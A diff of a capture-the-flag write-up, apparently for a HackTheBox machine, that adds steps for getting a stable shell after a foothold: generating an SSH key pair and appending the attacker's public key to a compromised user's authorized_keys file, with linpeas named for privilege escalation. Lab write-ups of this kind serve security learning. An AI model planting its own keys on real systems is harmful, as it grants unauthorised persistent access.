@@ -130,12 +130,41 @@ abb776efaca5d2c498c0340369be1cb1
 
 12. To do privesc, it's easier by running linpeas first to check for possible paths to escalate privileges.
 13. Let's get a stable shell first so we can simply send linpeas to the target server.
+14. Let's create ssh-keygen svc_acc.
 
-> FOUND RSA KEY PAIR at the user home dir.
+```
+┌──(brandy㉿bread-yolk)-[~/.ssh]
+└─$ ssh-keygen -f svc_acc          
+Generating public/private rsa key pair.
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in svc_acc
+Your public key has been saved in svc_acc.pub
+The key fingerprint is:
+SHA256:6wpncMbmOmG3ppV+uKtXtkKxqjYa9V1U3wCv1Uppw9g brandy@bread-yolk
+The key's randomart image is:
++---[RSA 3072]----+
+|          o..    |
+|         . * =   |
+|        . . E o  |
+|     ...   = o   |
+|  . . =oS . .    |
+| . .oB+oo.       |
+|.  .o=B=..       |
+| .o oB*.o        |
+|.o.o+*=*.        |
++----[SHA256]-----+
+```
 
-![image](https://github.com/jon-brandy/hackthebox/assets/70703371/72a198ac-6b4c-4103-b0f5-2645eed15f0e)
+15. Then copy our svc_acc.pub and append it to **authorized_keys** file at the remote server.
 
+```
+svc_acc@late:~/.ssh$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDxjPVPhAZqY1pPHV0kIjUOY987zhsVNL8tIU24XOYZlZTCjyGaOAEcH7GrY9MYbqHlR//eGzlXgIRWe97iDmXyqvoGV7SPhHrYFO8dhLndxRnPw1fEsCcs+vgdDG+I0h8KD5KXVJ1Py/gIVzB/F26klWYrVOTb3monzO6dvREBf28usBf4UDLcekWrUgel47Te38v1AQICVXUEUdUTk1cJA8GXs4Y4XKQnh+GdpZNM0REaIHQveYwTzzNtJ1p3QVPtBXWXUkJ0miifXBDjPVVKGperNZ9ukJrXFIpV6HSwh+/dl6Iv7YXEOOkMoHrS04+2cpSYsmemB7OxOnIGKnJhK6IvIBL6NWIe9a7edFfVLf+FCPJWkMl89667XbD/W2uDfJ2VICQ+uiaVs2TtXralVAg+X8NFFzOWuQrEQ6AQaSU29twkKi7Yh3T4nmRUegO9YdQB6EmQ4rr8AEQVsB4Jk2Kw8XdCx3rPiJ/SSth8FqrzdGLXE+z8zJiO3lGS+N8= brandy@bread-yolk" >> authorized_keys
+<8zJiO3lGS+N8= brandy@bread-yolk" >> authorized_keys
+svc_acc@late:~/.ssh$
+```
 
-14. 
+16. Finally, simply run --> `ssh -i svc_acc svc_acc@late.htb` and we got the stable shell.
+
 
 
